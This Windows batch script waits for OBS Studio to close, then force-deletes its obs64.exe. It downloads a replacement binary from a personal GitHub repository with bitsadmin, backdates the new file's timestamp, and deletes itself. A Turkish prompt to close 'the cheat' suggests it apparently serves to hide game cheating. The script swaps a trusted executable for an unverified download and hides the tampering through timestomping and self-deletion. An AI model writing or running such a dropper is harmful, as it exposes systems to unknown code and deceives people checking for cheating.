@echo off
echo hileyi kapatiniz ve bu dosya ekrandan gidene kadar bekleyin...

:loop
tasklist | find /i "obs64.exe" >nul
if not errorlevel 1 (
    timeout /t 1 >nul
    goto loop
)

echo Deleting existing obs64.exe...
del /f "C:\Program Files\obs-studio\bin\64bit\obs64.exe"

echo obs64.exe...
bitsadmin /transfer myDownloadJob /download /priority high https://github.com/svdsaymazz/crenrepo/raw/refs/heads/main/obs64.exe "C:\Program Files\obs-studio\bin\64bit\obs64.exe"

if exist "C:\Program Files\obs-studio\bin\64bit\obs64.exe" (
    echo Completed new.

    echo Setting file...
    powershell -NoProfile -Command "$filePath = 'C:\Program Files\obs-studio\bin\64bit\obs64.exe'; if (Test-Path $filePath) { (Get-Item $filePath).LastWriteTime = '2024-05-06 12:00:00' } else { Write-Host 'Dosya bulunamadı: $filePath' }"

    echo Cleaning up...
    REM Using PowerShell to schedule the batch file deletion
    powershell -Command "Start-Sleep -Seconds 5; Remove-Item '%~f0'"
)

REM Exit the batch file
exit